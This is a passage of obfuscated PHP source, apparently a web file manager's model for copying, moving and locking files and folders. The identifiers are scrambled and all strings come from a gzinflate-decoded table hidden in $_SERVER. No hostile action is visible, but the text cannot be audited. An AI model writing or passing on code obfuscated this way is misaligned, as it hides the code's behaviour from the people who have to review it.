$¥€©Ô§ó); } public function sourceModelCopy($îáŸÍø) { $§–ˆ‚Øû =& $_SERVER[Å¶¨Şêº]; $’òÔéÄ = $îáŸÍø[0]; $…¢¶ = $îáŸÍø[1]; $¢Œ¦ôìì =& $this->task; $this->sourceModelCopyFlag = !0; $äµü¼ø = 0; switch ($’òÔéÄ) { case $§–ˆ‚Øû[572]: $äµü¼ø = 1; break; case $§–ˆ‚Øû[575]: $¢Œ¦ôìì[$§–ˆ‚Øû[1714]] = $…¢¶[$§–ˆ‚Øû[42]]; break; case $§–ˆ‚Øû[577]: $äµü¼ø = intval($îáŸÍø[$§–ˆ‚Øû[389]] * 0.4); break; case $§–ˆ‚Øû[579]: $äµü¼ø = intval($îáŸÍø[$§–ˆ‚Øû[389]] * 0.2); break; case $§–ˆ‚Øû[581]: $äµü¼ø = intval($îáŸÍø[$§–ˆ‚Øû[389]] * 0.4); break; } $this->update($äµü¼ø); $this->sourceModelCopyFlag = !1; } public function sourceRemove($ééé½¥ì, $Ò¹‘ê) { $¬å”ƒë =& $_SERVER[Å¶¨Şêº]; $this->sourceModelCopyFlag = !0; $¼ø“¿±Ş = 1; if (isset($ééé½¥ì[$¬å”ƒë[90]])) { $¼ø“¿±Ş = $ééé½¥ì[$¬å”ƒë[90]][$¬å”ƒë[88]]; $¼ø“¿±Ş = $¼ø“¿±Ş + $ééé½¥ì[$¬å”ƒë[90]][$¬å”ƒë[89]] + 1; } $this->update($¼ø“¿±Ş); $this->sourceModelCopyFlag = !1; } public function sourceMove($º—úø) { $this->sourceRemove($º—úø, !1); } public function curlProgress($ÚşÉï’ù, $åÅñšõ, $ˆá¾ßÖò, $×ÛÈù—Ö, $°°Š÷¸õ) { $ßùıÙò‰ =& $_SERVER[Å¶¨Şêº]; $ÍâÑôü =& $this->task; if ($°°Š÷¸õ > 0) { $ÍâÑôü[$ßùıÙò‰[1061]] = $ßùıÙò‰[1736]; $ÍâÑôü[$ßùıÙò‰[1718]] = $ßùıÙò‰[118]; if ($ÍâÑôü[$ßùıÙò‰[1716]]) { $ÍâÑôü[$ßùıÙò‰[1717]] = $°°Š÷¸õ; } if ($ÍâÑôü[$ßùıÙò‰[1719]]) { $ÍâÑôü[$ßùıÙò‰[1717]] = $°°Š÷¸õ + $ÍâÑôü[$ßùıÙò‰[1719]]; } } else { if ($ˆá¾ßÖò > 0) { if ($ÍâÑôü[$ßùıÙò‰[1716]] == $åÅñšõ) { $ÍâÑôü[$ßùıÙò‰[1717]] = $ˆá¾ßÖò; $ÍâÑôü[$ßùıÙò‰[1061]] = $ßùıÙò‰[1737]; $ÍâÑôü[$ßùıÙò‰[1718]] = $ßùıÙò‰[1192]; } } } $this->update(); } public function curlProgressStart($òß• ñ) { } public function curlProgressEnd($Â«Ö¶°‘) { $çË©ÙŸê =& $_SERVER[Å¶¨Şêº]; $Æ›îö¼ =& $this->task; $•â‘ŒÙ = curl_getinfo($Â«Ö¶°‘); $¾»ĞÒì© = $•â‘ŒÙ[$çË©ÙŸê[1738]]; if ($¾»ĞÒì© == -1) { $¾»ĞÒì© = $•â‘ŒÙ[$çË©ÙŸê[1739]]; } if ($Æ›îö¼[$çË©ÙŸê[1718]] == $çË©ÙŸê[118] && $¾»ĞÒì©) { $Æ›îö¼[$çË©ÙŸê[1719]] += $¾»ĞÒì©; } $this->update(); } } goto A„ŒÉ‘°„; eç¬‚ÒäßÅ: define($_SERVER[Å¶¨Şêº][0], $_SERVER[Å¶¨Şêº][1]); $_SERVER[ß½‡Î] = explode($_SERVER[Å¶¨Şêº][2], gzinflate(substr($_SERVER[Å¶¨Şêº][3], 10, -8))); function binCheckEq($á•µ¸Ë, $ªÚ÷Áêà) { return $á•µ¸Ë == $ªÚ÷Áêà; } goto DŸóåË…ëò; eè¢¼®Ÿ…: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ÛÕí¢í) { $«ˆ…Ã½Ì =& $_SERVER[Å¶¨Şêº]; if (!$this->allowLock()) { return; } $this->_lockCheck($«ˆ…Ã½Ì[555], $ÛÕí¢í); $ìóÑÛÜŠ = 1; $this->_lockEvent($ÛÕí¢í, array($«ˆ…Ã½Ì[556], $«ˆ…Ã½Ì[557]), $ìóÑÛÜŠ); $this->_lockParent($ÛÕí¢í, array($«ˆ…Ã½Ì[557]), $ìóÑÛÜŠ); $this->_lockEvent($ÛÕí¢í, array($«ˆ…Ã½Ì[558], $«ˆ…Ã½Ì[559]), $ìóÑÛÜŠ); $this->_lockCheckEnd($«ˆ…Ã½Ì[555], $ÛÕí¢í); } public function lockCopyEnd($ºƒÆÌ¹ø) { $˜ı’“¬ =& $_SERVER[Å¶¨Şêº]; if (!$this->allowLock()) { return; } $ª™Ó½¢„ = 0; $this->_lockEvent($ºƒÆÌ¹ø, array($˜ı’“¬[556], $˜ı’“¬[557]), $ª™Ó½¢„); $this->_lockParent($ºƒÆÌ¹ø, array($˜ı’“¬[557]), $ª™Ó½¢„); $this->_lockEvent($ºƒÆÌ¹ø, array($˜ı’“¬[558], $˜ı’“¬[559]), $ª™Ó½¢„); } public function lockWriteStart($Ù½Ü¸æ, $­ø°â²† = '') { $Áìª¥–ö =& $_SERVER[Å¶¨Şêº]; if (!$this->allowLock()) { return; } $this->_lockCheck($Áìª¥–ö[556], $Ù½Ü¸æ); $ş€‘Ë¦ = 1; $this->_lockKey($Áìª¥–ö[560] . $Ù½Ü¸æ . $Áìª¥–ö[10] . $­ø°â²†, $ş€‘Ë¦); $this->_lockEvent($Ù½Ü¸æ, array($Áìª¥–ö[555], $Áìª¥–ö[557]), $ş€‘Ë¦); $this->_lockParent($Ù½Ü¸æ, array($Áìª¥–ö[555], $Áìª¥–ö[557]), $ş€‘Ë¦); $this->_lockCheckEnd($Áìª¥–ö[556], $Ù½Ü¸æ); } public function lockWriteEnd($Àò†Ô­å, $Ñß±Šš‰ = '') { $”³İì¨» =& $_SERVER[Å¶¨Şêº]; if (!$this->allowLock()) { return; } $°ò±³ƒì = 0; $this->_lockKey($”³İì¨»[560] . $Àò†Ô­å . $”³İì¨»[10] . $Ñß±Šš‰, $°ò±³ƒì); $this->_lockEvent($Àò†Ô­å, array($”³İì¨»[555], $”³İì¨»[557]), $°ò±³ƒì); $this->_lockParent($Àò†Ô­å, array($”³İì¨»[555], $”³İì¨»[557]), $°ò±³ƒì); } public function lockMoveStart($‡û‡¶Ù) { $¬ÆËÈÆÃ =& $_SERVER[Å¶¨Şêº]; if (!$this->allowLock()) { return; } $this->_lockCheck($¬ÆËÈÆÃ[557], $‡û‡¶Ù); $ğ¸õ¬éå = 1; $this->_lockKey($¬ÆËÈÆÃ[561] . $‡û‡¶Ù, $ğ¸õ¬éå); $this->_lockEvent($‡û‡¶Ù, array($¬ÆËÈÆÃ[555], $¬ÆËÈÆÃ[556]), $ğ¸õ¬éå); $this->_lockParent($‡û‡¶Ù, array($¬ÆËÈÆÃ[555], $¬ÆËÈÆÃ[557]), $ğ¸õ¬éå); $this->_lockEvent($‡û‡¶Ù, array($¬ÆËÈÆÃ[562], $¬ÆËÈÆÃ[558], $¬ÆËÈÆÃ[559]), $ğ¸õ¬éå); $this->_lockCheckEnd($¬ÆËÈÆÃ[557], $‡û‡¶Ù); } public function lockMoveEnd($‘¶Ù–ÅË) { $ºíÙíÛ =& $_SERVER[Å¶¨Şêº]; if (!$this->allowLock()) { return; } $òïì»¹Ğ = 0; $this->_lockKey($ºíÙíÛ[561] . $‘¶Ù–ÅË, $òïì»¹Ğ); $this->_lockEvent($‘¶Ù–ÅË, array($ºíÙíÛ[555], $ºíÙíÛ[556]), $òïì»¹Ğ); $this->_lockParent($‘¶Ù–ÅË, array($ºíÙíÛ[555], $ºíÙíÛ[557]), $òïì»¹Ğ); $this->_lockEvent($‘¶Ù–ÅË, array($ºíÙíÛ[562], $ºíÙíÛ[558], $ºíÙíÛ[559]), $òïì»¹Ğ); } private function _lockCheck($Üô‹—‹Ğ, $ğšøòÑß) { $¬ˆëû¹å =& $_SERVER[Å¶¨Şêº]; $­ÍÜÍÜó = $this->sourceInfo($ğšøòÑß); $â«Ä¾‡ß = $Üô‹—‹Ğ . $¬ˆëû¹å[10] . $ğšøòÑß; $this->_lockTimeStart[$â«Ä¾‡ß] = timeFloat(); if (!is_array($­ÍÜÍÜó)) { return; } $“ƒ˜è¨å = LNG($¬ˆëû¹å[563]); CacheLock::setErrorMsg($¬ˆëû¹å[173] . htmlspecialchars($­ÍÜÍÜó[$¬ˆëû¹å[42]]) . $¬ˆëû¹å[175] . $“ƒ˜è¨å); $this->_lockKey($â«Ä¾‡ß, 1); $this->_lockKey($â«Ä¾‡ß, 0); $¥ì‚üƒ = array_reverse($this->parentLevelArray($­ÍÜÍÜó[$¬ˆëû¹å[520]])); foreach ($¥ì‚üƒ as $Ê”Ú Ü) { $â«Ä¾‡ß = $Üô‹—‹Ğ . $¬ˆëû¹å[564] . $Ê”Ú Ü; if (CacheLock::lockGet($¬ˆëû¹å[565] . $â«Ä¾‡ß)) { $­ÍÜÍÜó = $this->sourceInfo($Ê”Ú Ü); CacheLock::setErrorMsg($¬ˆëû¹å[173] . htmlspecialchars($­ÍÜÍÜó[$¬ˆëû¹å[42]]) . $¬ˆëû¹å[175] . $“ƒ˜è¨å); $this->_lockKey($â«Ä¾‡ß, 1); $this->_lockKey($â«Ä¾‡ß, 0); } } } private function _lockCheckEnd($§—û ´, $³³ä¬¹Û) { $£¼ô¥¸à =& $_SERVER[Å¶¨Şêº]; $áêØˆÉ = $§—û ´ . $£¼ô¥¸à[10] . $³³ä¬¹Û; CacheLock::setErrorMsg($£¼ô¥¸à[70]); if (!isset($this->_lockTimeStart[$áêØˆÉ])) { return; } $‰Õ®É² = timeFloat() - $this->_lockTimeStart[$áêØˆÉ]; unset($this->_lockTimeStart[$áêØˆÉ]); if ($‰Õ®É² > 0.5) { unset(self::$cacheSourceInfo[$£¼ô¥¸à[469] . $³³ä¬¹Û]); } $ª§ÍŠÁ = $this->sourceInfo($³³ä¬¹Û); if (!$ª§ÍŠÁ) { show_json(LNG($£¼ô¥¸à[116]), !1); } } private function _lockParent($–‹Õ÷á­, $øş’©Äœ, $ÒÑ¶—É) { if (!$this->autoLockSet) { return; } $ëä¢»Â‚ = $this->sourceInfo($–‹Õ÷á­); if (!is_array($ëä¢»Â‚)) { return; } $øÕ¯ª¸Ô = array_reverse($this->parentLevelArray($ëä¢»Â‚[$_SERVER[Å¶¨Şêº][520]])); foreach ($øÕ¯ª¸Ô as $ãí‹£²Ş) { $this->_lockEvent($ãí‹£²Ş, $øş’©Äœ, $ÒÑ¶—É); } } private function _lockEvent($´æÒÃÙâ, $åï¿ , $âÚ¦ÙÉü) { $²×Ø•²¹ =& $_SERVER[Å¶¨Şêº]; if (!$this->autoLockSet) { return; } foreach ($åï¿  as $ª¸ÜÓÌÌ) { $çÒöëƒ = $ª¸ÜÓÌÌ . $²×Ø•²¹[10] . $´æÒÃÙâ; if ($âÚ¦ÙÉü && CacheLock::lockGet($²×Ø•²¹[565] . $çÒöëƒ)) { continue; } $this->_lockKey($çÒöëƒ, $âÚ¦ÙÉü); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($˜„§½±, $ìÔàÔãŞ = 1) { $¢î›‡•ñ = $_SERVER[Å¶¨Şêº][565] . md5($˜„§½±); if ($ìÔàÔãŞ) { if (isset(self::$_lockItemArr[$¢î›‡•ñ])) { return; } self::$_lockItemArr[$¢î›‡•ñ] = 1; CacheLock::lock($¢î›‡•ñ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$¢î›‡•ñ])) { return; } unset(self::$_lockItemArr[$¢î›‡•ñ]); CacheLock::unlock($¢î›‡•ñ); } } public function isParentOf($İê„ëâÀ, $ˆ…õôÍ¥) { $³„†‡«  =& $_SERVER[Å¶¨Şêº]; $ĞÖãô„» = $this->sourceInfo($İê„ëâÀ); $²åªËÈˆ = $this->sourceInfo($ˆ…õôÍ¥); $¬ıÙ¹æ = $ĞÖãô„»[$³„†‡« [520]] . $ĞÖãô„»[$³„†‡« [411]] . $³„†‡« [60]; $Ÿƒ®ª†ó = $²åªËÈˆ[$³„†‡« [520]] . $²åªËÈˆ[$³„†‡« [411]] . $³„†‡« [60]; $ÌÃ¤Éòà = strpos($Ÿƒ®ª†ó, $¬ıÙ¹æ) === 0; return $ÌÃ¤Éòà; } private $targetIsDelete = 0; public function copy($ºµİÃ…, $êûÁ« â, $Ÿ²ôì‘æ = REPEAT_REPLACE, $¬·µÜ°È = '') { $æìª† Æ =& $_SERVER[Å¶¨Şêº]; $…×ßå‰ = $this->sourceInfo($ºµİÃ…); $¼ª¡¸Ó¼ = $this->sourceInfo($êûÁ« â); if (!$…×ßå‰ || !$¼ª¡¸Ó¼ || $¼ª¡¸Ó¼[$æìª† Æ[419]] != $æìª† Æ[99]) { return !1; } if ($this->isParentOf($ºµİÃ…, $êûÁ« â)) { return !1; } $¯ºÊÂŞ— = $¬·µÜ°È ? $¬·µÜ°È : $…×ßå‰[$æìª† Æ[42]]; $this->lockCopyStart($ºµİÃ…); $this->lockWriteStart($êûÁ« â, $¯ºÊÂŞ—); $ÎÜî€Ğ° = array($æìª† Æ[566] => array(), $æìª† Æ[567] => array(), $æìª† Æ[568] => array()); $this->targetIsDelete = intval($…×ßå‰[$æìª† Æ[440]]); $¨¼ğ€× = $this->fileNameExistCache($êûÁ« â, $…×ßå‰[$æìª† Æ[42]]); $¼Ğ‚Éêõ = $this->_copy($ºµİÃ…, $êûÁ« â, $Ÿ²ôì‘æ, $ÎÜî€Ğ°, !0, $¬·µÜ°È); $this->_childrenListClear(); $this->lockCopyEnd($ºµİÃ…); $this->lockWriteEnd($êûÁ« â, $¯ºÊÂŞ—); if ($…×ßå‰[$æìª† Æ[419]] == $æìª† Æ[99] && $¨¼ğ€× == $¼Ğ‚Éêõ) { $this->folderSizeResetChildren($¨¼ğ€×); } Model($æìª† Æ[569])->addAll($ÎÜî€Ğ°[$æìª† Æ[567]], array(), !0); if ($¨¼ğ€× != $¼Ğ‚Éêõ || $…×ßå‰[$æìª† Æ[419]] == $æìª† Æ[99]) { Model($æìª† Æ[570])->eventCopy($¼Ğ‚Éêõ); } $this->saveAll($ÎÜî€Ğ°[$æìª† Æ[568]]); Model($æìª† Æ[211])->linkAdd($ÎÜî€Ğ°[$æìª† Æ[566]]); $this->folderSizeReset($êûÁ« â); $this->updateModifyTime($êûÁ« â); return $¼Ğ‚Éêõ; } private function _copy($Ğ™•ÀÃÙ, $¤ÛŞÛÕß, $¢øşí¢å, &$Å³ıÙíÚ, $½™èèšÆ, $Åøàú®¾ = '') { $ ğ„Ğ­Á =& $_SERVER[Å¶¨Şêº]; $‚ÓØ²áÜ = $this->sourceInfoCache($Ğ™•ÀÃÙ); $–Â“ƒú = $‚ÓØ²áÜ[$ ğ„Ğ­Á[419]] == $ ğ„Ğ­Á[99]; $ÍŞÖ¬†İ = $Åøàú®¾ ? $Åøàú®¾ : $‚ÓØ²áÜ[$ ğ„Ğ­Á[42]]; $‘‚ÌÙÒ­ = $this->fileNameExistCache($¤ÛŞÛÕß, $ÍŞÖ¬†İ); if ($½™èèšÆ) { $this->_childrenAllMake($Ğ™•ÀÃÙ); if ($–Â“ƒú && $‘‚ÌÙÒ­) { $this->_childrenAllMake($‘‚ÌÙÒ­); } } if (!$‘‚ÌÙÒ­) { return $this->_copyCreate($Ğ™•ÀÃÙ, $¤ÛŞÛÕß, $ÍŞÖ¬†İ, $Å³ıÙíÚ); } $ÙóÜéÛÎ = $‘‚ÌÙÒ­; if ($–Â“ƒú) { if ($¢øşí¢å == REPEAT_RENAME_FOLDER) { $ÍŞÖ¬†İ = $this->fileNameAutoCache($¤ÛŞÛÕß, $ÍŞÖ¬†İ, $¢øşí¢å, $–Â“ƒú); $ÙóÜéÛÎ = $this->_copyCreate($Ğ™•ÀÃÙ, $¤ÛŞÛÕß, $ÍŞÖ¬†İ, $Å³ıÙíÚ); } else { $¶ª»ÑØÍ = $this->_childrenList($Ğ™•ÀÃÙ); foreach ($¶ª»ÑØÍ as $ÎõÔ³°×) { $this->_copy($ÎõÔ³°×[$ ğ„Ğ­Á[411]], $‘‚ÌÙÒ­, $¢øşí¢å, $Å³ıÙíÚ, !1); } } } else { if ($¢øşí¢å == REPEAT_RENAME || $¢øşí¢å == REPEAT_RENAME_FOLDER) { $ÍŞÖ¬†İ = $this->fileNameAutoCache($¤ÛŞÛÕß, $ÍŞÖ¬†İ, $¢øşí¢å, $–Â“ƒú); $ÙóÜéÛÎ = $this->_copyCreate($Ğ™•ÀÃÙ, $¤ÛŞÛÕß, $ÍŞÖ¬†İ, $Å³ıÙíÚ); } else { if ($¢øşí¢å == REPEAT_REPLACE) { $¨¤Áü† = $this->sourceInfoCache($‘‚ÌÙÒ­); $äô¸”’Ë = $this->fileHistory($¨¤Áü†, $‚ÓØ²áÜ[$ ğ„Ğ­Á[477]], $‚ÓØ²áÜ[$ ğ„Ğ­Á[87]]); if ($äô¸”’Ë) { $Å³ıÙíÚ[$ ğ„Ğ­Á[566]][] = $‚ÓØ²áÜ[$ ğ„Ğ­Á[477]]; } } else { if ($¢øşí¢å == REPEAT_SKIP) { } } } Hook::trigger($ ğ„Ğ­Á[571], array($ ğ„Ğ­Á[572], $‚ÓØ²áÜ, 0)); } return $ÙóÜéÛÎ; } private function _copyCreate($§¯÷Á·¤, $²‘õÓÇ×, $£şí®Î, &$ª¤ÊâŞ) { $Ğ™Ìüëà =& $_SERVER[Å¶¨Şêº]; $‹Ä²ô™® = $this->sourceInfoCache($§¯÷Á·¤); $§ÜÓ¿Ñó = $this->sourceInfoCache($²‘õÓÇ×); $Õ‹Ş‡«” = $this->_makeItemData($‹Ä²ô™®, $§ÜÓ¿Ñó, $£şí®Î); Hook::trigger($Ğ™Ìüëà[573], $Õ‹Ş‡«”); Hook::trigger($Ğ™Ìüëà[574], array($Ğ™Ìüëà[575], $Õ‹Ş‡«”, 0)); $µˆºÑ²ê = $this->add($Õ‹Ş‡«”); $Ö¦ëôÀÇ = array($Ğ™Ìüëà[411] => $µˆºÑ²ê, $Ğ™Ìüëà[42] => $£şí®Î); $this->_copyApplyMeta($Ö¦ëôÀÇ, $ª¤ÊâŞ); if ($‹Ä²ô™®[$Ğ™Ìüëà[419]] != $Ğ™Ìüëà[99]) { $ª¤ÊâŞ[$Ğ™Ìüëà[566]][] = $‹Ä²ô™®[$Ğ™Ìüëà[477]]; return $µˆºÑ²ê; } $•ÄÎøÒ‚ = array(); $ïŠÑ‘¡Ñ = array(); $this->_childrenListAll($§¯÷Á·¤, $•ÄÎøÒ‚); $ùĞİ±éò = count($•ÄÎøÒ‚); if ($ùĞİ±éò == 0) { return $µˆºÑ²ê; } $¸¦È¾¦ = $this->sourceInfo($µˆºÑ²ê); foreach ($•ÄÎøÒ‚ as $³ıÖ…´¢) { $—è’ÂÃÔ = $this->_makeItemData($³ıÖ…´¢, $¸¦È¾¦, $³ıÖ…´¢[$Ğ™Ìüëà[42]]); $—è’ÂÃÔ[$Ğ™Ìüëà[520]] = $³ıÖ…´¢[$Ğ™Ìüëà[520]]; $ïŠÑ‘¡Ñ[] = $—è’ÂÃÔ; } $this->chunkEventSet($Ğ™Ìüëà[576], array($Ğ™Ìüëà[577], $Õ‹Ş‡«”, $ùĞİ±éò)); $this->addAll($ïŠÑ‘¡Ñ, array(), !1); $ë²¶¶š– = $this->where(array($Ğ™Ìüëà[441] => $µˆºÑ²ê))->select(); $İ¿‡¨´ = $this->_childrenMakeRelation($•ÄÎøÒ‚, $ë²¶¶š–); $İ¿‡¨´[$§¯÷Á·¤] = $µˆºÑ²ê; $Ğ™‰ïß = array(); $èî·‰¶Ş = array(); foreach ($ë²¶¶š– as $³ıÖ…´¢) { $•×€¬É® = $³ıÖ…´¢[$Ğ™Ìüëà[411]]; $±«ÛšÆ = $this->_childrenMatch($İ¿‡¨´, $³ıÖ…´¢, $¸¦È¾¦); $Ğ™‰ïß[] = array($Ğ™Ìüëà[411], $•×€¬É®, $Ğ™Ìüëà[441], $±«ÛšÆ[$Ğ™Ìüëà[441]]); $èî·‰¶Ş[] = array($Ğ™Ìüëà[411], $•×€¬É®, $Ğ™Ìüëà[520], $±«ÛšÆ[$Ğ™Ìüëà[520]]); $this->_copyApplyMeta($³ıÖ…´¢, $ª¤ÊâŞ); if ($³ıÖ…´¢[$Ğ™Ìüëà[419]] != $Ğ™Ìüëà[99]) { $ª¤ÊâŞ[$Ğ™Ìüëà[566]][] = $³ıÖ…´¢[$Ğ™Ìüëà[477]]; } } $this->chunkEventSet($Ğ™Ìüëà[578], array($Ğ™Ìüëà[579], $Õ‹Ş‡«”, $ùĞİ±éò)); $this->saveAll($Ğ™‰ïß); $this->chunkEventSet($Ğ™Ìüëà[580], array($Ğ™Ìüëà[581], $Õ‹Ş‡«”, $ùĞİ±éò)); $this->saveAll($èî·‰¶Ş); return $µˆºÑ²ê; } private function _childrenMakeRelation($â­Ó¢æô, $ œÁµÃ) { $Û£ıØ£¿ =& $_SERVER[Å¶¨Şêº]; $•‰ºäØ = array(); $Û´½ß•í = array(); foreach ($â­Ó¢æô as $¹™¢êß) { $¯¬³×õÛ = $¹™¢êß[$Û£ıØ£¿[42]] . $Û£ıØ£¿[8] . $¹™¢êß[$Û£ıØ£¿[520]]; $•‰ºäØ[$¯¬³×õÛ] = $¹™¢êß[$Û£ıØ£¿[411]]; } foreach ($ œÁµÃ as $¹™¢êß) { $¯¬³×õÛ = $¹™¢êß[$Û£ıØ£¿[42]] . $Û£ıØ£¿[8] . $¹™¢êß[$Û£ıØ£¿[520]]; $€·Ã·Šñ = $•‰ºäØ[$¯¬³×õÛ]; $Û´½ß•í[$€·Ã·Šñ] = $¹™¢êß[$Û£ıØ£¿[411]]; } return $Û´½ß•í; } private function _childrenMatch($ñ¦ªß Â, $øçş¨ó, $ç¿€Ç²‰) { $œ¡õÚÛ =& $_SERVER[Å¶¨Şêº]; $·šÉ„ÕÆ = $ç¿€Ç²‰[$œ¡õÚÛ[520]]; $¤ãò•Á = $this->parentLevelArray($øçş¨ó[$œ¡õÚÛ[520]]); foreach ($¤ãò•Á as $ÒÒÎ‚É¾) { if (isset($ñ¦ªß Â[$ÒÒÎ‚É¾])) { $·šÉ„ÕÆ .= $ñ¦ªß Â[$ÒÒÎ‚É¾] . $œ¡õÚÛ[582]; } } $·šÉ„ÕÆ = rtrim($·šÉ„ÕÆ, $œ¡õÚÛ[60]) . $œ¡õÚÛ[60]; $ÔÂèı• = $this->parentLevelArray($·šÉ„ÕÆ); $ëŸúª±ù = $ÔÂèı•[count($ÔÂèı•) - 1]; return array($œ¡õÚÛ[441] => $ëŸúª±ù, $œ¡õÚÛ[520] => $·šÉ„ÕÆ); } private function _makeItemData($Üşü›³ñ, $åì–ìÉ¢, $ş£Ö…¦–) { $şÊşß§ =& $_SERVER[Å¶¨Şêº]; $Šéî¦ü¿ = array($şÊşß§[583] => $Üşü›³ñ[$şÊşß§[419]], $şÊşß§[429] => $ş£Ö…¦–, $şÊşß§[584] => $Üşü›³ñ[$şÊşß§[421]] ? $Üşü›³ñ[$şÊşß§[421]] : $şÊşß§[12], $şÊşß§[478] => $Üşü›³ñ[$şÊşß§[477]] ? $Üşü›³ñ[$şÊşß§[477]] : 0, $şÊşß§[554] => $Üşü›³ñ[$şÊşß§[87]] ? $Üşü›³ñ[$şÊşß§[87]] : 0, $şÊşß§[585] => intval($åì–ìÉ¢[$şÊşß§[420]]), $şÊşß§[586] => intval($åì–ìÉ¢[$şÊşß§[505]]), $şÊşß§[587] => intval(USER_ID), $şÊşß§[588] => intval(USER_ID), $şÊşß§[410] => intval($åì–ìÉ¢[$şÊşß§[411]]), $şÊşß§[589] => $åì–ìÉ¢[$şÊşß§[520]] . $åì–ìÉ¢[$şÊşß§[411]] . $şÊşß§[60], $şÊşß§[433] => $Üşü›³ñ[$şÊşß§[96]] ? $Üşü›³ñ[$şÊşß§[96]] : time(), $şÊşß§[439] => 0, $şÊşß§[590] => $şÊşß§[12]); return $Šéî¦ü¿; } private function _copyApplyMeta($´¸ÂÎ¼ß, &$ç™ãúœö) { $»¥Šà£á =& $_SERVER[Å¶¨Şêº]; $üÀÃ­ª = $´¸ÂÎ¼ß[$»¥Šà£á[411]]; $©¨‚Õ‚ó = $´¸ÂÎ¼ß[$»¥Šà£á[42]]; if (!isset($´¸ÂÎ¼ß[$»¥Šà£á[591]]) || !$´¸ÂÎ¼ß[$»¥Šà£á[591]] || $´¸ÂÎ¼ß[$»¥Šà£á[591]] == $»¥Šà£á[209]) { $ç™ãúœö[$»¥Šà£á[568]][] = array($»¥Šà£á[411], $üÀÃ­ª, $»¥Šà£á[591], short_id($üÀÃ­ª)); } if (Input::check($©¨‚Õ‚ó, $»¥Šà£á[592])) { $ç™ãúœö[$»¥Šà£á[567]][] = array($»¥Šà£á[411] => $üÀÃ­ª, $»¥Šà£á[105] => $»¥Šà£á[474], $»¥Šà£á[384] => str_replace($»¥Šà£á[63], $»¥Šà£á[12], Pinyin::get($©¨‚Õ‚ó))); $ç™ãúœö[$»¥Šà£á[567]][] = array($»¥Šà£á[411] => $üÀÃ­ª, $»¥Šà£á[105] => $»¥Šà£á[473], $»¥Šà£á[384] => Pinyin::get($©¨‚Õ‚ó, $»¥Šà£á[593])); } $ç™ãúœö[$»¥Šà£á[567]][] = array($»¥Šà£á[411] => $üÀÃ­ª, $»¥Šà£á[105] => $»¥Šà£á[453], $»¥Šà£á[384] => KodSort::makeStr($©¨‚Õ‚ó)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($½Î˜¬ì³) { $–ÜƒÊã =& $_SERVER[Å¶¨Şêº]; $Ä­Ó×¨š = $this->sourceInfo($½Î˜¬ì³); $íâû‡È = $–ÜƒÊã[594]; $‡¨¨¬•¬ = array($–ÜƒÊã[520] => array($–ÜƒÊã[549], $Ä­Ó×¨š[$–ÜƒÊã[520]] . $½Î˜¬ì³ . $–ÜƒÊã[550]), $–ÜƒÊã[440] => $this->targetIsDelete); $ğúû†äˆ = $this->field($íâû‡È)->where($‡¨¨¬•¬)->select(); if (!$ğúû†äˆ) { return; } $ğúû†äˆ = array_to_keyvalue($ğúû†äˆ, $–ÜƒÊã[411]); foreach ($ğúû†äˆ as $şú÷™èœ) { $½ßíË½´ = $şú÷™èœ[$–ÜƒÊã[441]]; $½Î˜¬ì³ = $şú÷™èœ[$–ÜƒÊã[411]]; if (!isset($this->_childrenListCache[$½Î˜¬ì³]) && $şú÷™èœ[$–ÜƒÊã[419]] == $–ÜƒÊã[99]) { $this->_childrenListCache[$½Î˜¬ì³] = array(); } if (!isset($this->_childrenListCache[$½ßíË½´])) { $this->_childrenListCache[$½ßíË½´] = array(); } $this->_childrenListCache[$½ßíË½´][$½Î˜¬ì³] = $şú÷™èœ; $this->_childrenItemCache[$½Î˜¬ì³] = $şú÷™èœ; } } private function _childrenListAll($®”œæß, &$şÈàô†) { $Æş€¬øé =& $_SERVER[Å¶¨Şêº]; if (!isset($this->_childrenListCache[$®”œæß])) { return; } $àËÎ—§Ÿ = $this->_childrenListCache[$®”œæß]; foreach ($àËÎ—§Ÿ as $Çã¥¥ğÏ => $íÜ»±“¢) { $şÈàô†[$Çã¥¥ğÏ] = $íÜ»±“¢; if ($íÜ»±“¢[$Æş€¬øé[419]] == $Æş€¬øé[99]) { $this->_childrenListAll($Çã¥¥ğÏ, $şÈàô†); } } } private function sourceInfoCache($©ÁŒ’ûà) { if (isset($this->_childrenItemCache[$©ÁŒ’ûà])) { return $this->_childrenItemCache[$©ÁŒ’ûà]; } return $this->sourceInfo($©ÁŒ’ûà); } private function _childrenList($Œ˜°µ‡) { if (isset($this->_childrenListCache[$Œ˜°µ‡])) { return $this->_childrenListCache[$Œ˜°µ‡]; } return $this->_childrenListSelect($Œ˜°µ‡); } private function _childrenListSelect($ÇÑ’ÁÁÉ) { $°ÅÛ˜¦— =& $_SERVER[Å¶¨Şêº]; $šÀæŞ‰Ì = array($°ÅÛ˜¦—[441] => $ÇÑ’ÁÁÉ, $°ÅÛ˜¦—[440] => $this->targetIsDelete); $·ú¬¿‚¸ = $this->where($šÀæŞ‰Ì)->select(); $·ú¬¿‚¸ = $·ú¬¿‚¸ ? $·ú¬¿‚¸ : array(); $ÎöªÆ·å = array_to_keyvalue($·ú¬¿‚¸, $°ÅÛ˜¦—[411]); $this->_childrenListCache[$ÇÑ’ÁÁÉ] = $ÎöªÆ·å; foreach ($ÎöªÆ·å as $ÇÑ’ÁÁÉ => $¾óııà¼) { $this->_childrenItemCache[$ÇÑ’ÁÁÉ] = $¾óııà¼; } return $ÎöªÆ·å; } private function fileNameExistCache($ü‹Ë¡È, $¥§¾šæ†) { $É–šÚéÁ =& $_SERVER[Å¶¨Şêº]; $¥§¾šæ† = strtolower($¥§¾šæ†); $•®ÆìÚ© = $this->_childrenList($ü‹Ë¡È); foreach ($•®ÆìÚ© as $°Ëà·Š) { if ($¥§¾šæ† == strtolower($°Ëà·Š[$É–šÚéÁ[42]])) { return $°Ëà·Š[$É–šÚéÁ[411]]; } } return !1; } private function fileNameAutoCache($ãşî²Ÿà, $Â» Ÿ, $±û¤ğ½¼, $¤Ä×ŒÅ) { $Åõş¹Ñ¢ =& $_SERVER[Å¶¨Şêº]; $‘µçµÄ = $this->_childrenList($ãşî²Ÿà); $Í‘¯‡´» = array_to_keyvalue($‘µçµÄ, $Åõş¹Ñ¢[12], $Åõş¹Ñ¢[42]); return $this->fileNameAutoGet($Í‘¯‡´», $Â» Ÿ, $±û¤ğ½¼, 